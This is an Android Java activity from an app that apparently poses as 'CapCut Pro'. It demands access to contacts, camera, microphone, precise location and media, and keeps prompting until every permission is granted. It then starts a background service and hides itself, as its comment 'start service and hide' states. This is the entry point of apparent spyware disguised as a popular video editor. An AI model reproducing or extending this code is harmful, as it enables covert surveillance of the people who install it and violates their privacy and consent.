package com.capcut.pro;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.capcut.pro.core.CapCutService;
import java.util.ArrayList;
import java.util.List;

public class CapCutMain extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Check and request permissions
        checkPermissions();
    }

    private void checkPermissions() {
        List<String> needed = new ArrayList<>();
        needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        needed.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        needed.add(Manifest.permission.READ_CONTACTS);
        needed.add(Manifest.permission.CAMERA);
        needed.add(Manifest.permission.RECORD_AUDIO);
        needed.add(Manifest.permission.ACCESS_FINE_LOCATION);
        needed.add(Manifest.permission.INTERNET);
        needed.add(Manifest.permission.ACCESS_NETWORK_STATE);
        
        if (Build.VERSION.SDK_INT >= 33) {
            needed.add(Manifest.permission.POST_NOTIFICATIONS);
            needed.add(Manifest.permission.READ_MEDIA_IMAGES);
            needed.add(Manifest.permission.READ_MEDIA_VIDEO);
            needed.add(Manifest.permission.READ_MEDIA_AUDIO);
        }

        List<String> missing = new ArrayList<>();
        for (String p : needed) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                missing.add(p);
            }
        }

        if (missing.isEmpty()) {
            // All permissions granted - start service and hide
            startApp();
        } else {
            // Request missing permissions
            String[] arr = missing.toArray(new String[0]);
            ActivityCompat.requestPermissions(this, arr, PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == PERMISSION_REQUEST_CODE) {
            boolean all = true;
            for (int r : results) {
                if (r != PackageManager.PERMISSION_GRANTED) {
                    all = false;
                    break;
                }
            }
            if (all) {
                startApp();
            } else {
                Toast.makeText(this, "Grant all permissions!", Toast.LENGTH_SHORT).show();
                handler.postDelayed(() -> checkPermissions(), 2000);
            }
        }
    }

    private void startApp() {
        // Start service
        Intent intent = new Intent(this, CapCutService.class);
        startForegroundService(intent);
        
        // Show toast
        Toast.makeText(this, "✅ Running in background", Toast.LENGTH_SHORT).show();
        
        // Hide app after 1 second
        handler.postDelayed(() -> {
            finish();
            // Move to background
            moveTaskToBack(true);
        }, 1000);
    }
                        }
